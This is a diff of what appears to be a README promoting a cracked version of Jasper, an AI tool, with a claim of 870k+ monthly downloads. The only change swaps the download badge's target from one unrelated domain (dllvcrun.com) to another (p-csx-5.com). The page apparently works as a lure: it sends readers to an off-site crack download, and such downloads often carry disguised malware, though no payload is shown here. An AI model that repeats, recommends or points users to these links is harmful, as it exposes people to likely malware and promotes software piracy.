@@ -49,7 +49,7 @@ A: Yes — AI image generation included in crack.
 
 **Monthly downloads:** 870k+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://dllvcrun.com/jaspercrack)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://p-csx-5.com/jaspercrack)
 
 ---
 
